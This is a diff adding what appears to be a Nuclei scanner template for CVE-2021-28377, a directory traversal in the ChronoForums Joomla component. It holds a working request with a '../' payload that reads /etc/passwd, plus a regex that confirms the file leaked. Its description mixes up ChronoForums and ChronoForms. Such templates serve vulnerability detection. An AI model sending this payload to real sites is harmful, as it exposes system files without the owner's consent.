@@ -1,0 +1,25 @@
+id: CVE-2021-28377
+info:
+  name: ChronoForums 2.0.11 Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    ChronoEngine ChronoForms is an easy-to-use and flexible form builder for Joomla by ChronoEngine. A path traversal vulnerability exists in ChronoEngine ChronoForms that arises from the product's failure to properly filter special elements in resource or file paths. An attacker could exploit this vulnerability to gain access to sensitive information outside the restricted directory.
+  tags: directory-traversal, joomla
+  reference:
+    - https://herolab.usd.de/en/security-advisories/usd-2021-0007/
+    - https://www.chronoengine.com/chronoforms
+
+http:
+  - raw:
+      - |
+        GET /index.php/component/chronoforums2/profiles/avatar/u1?tvout=file&av=../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:(x*?):0:0:"
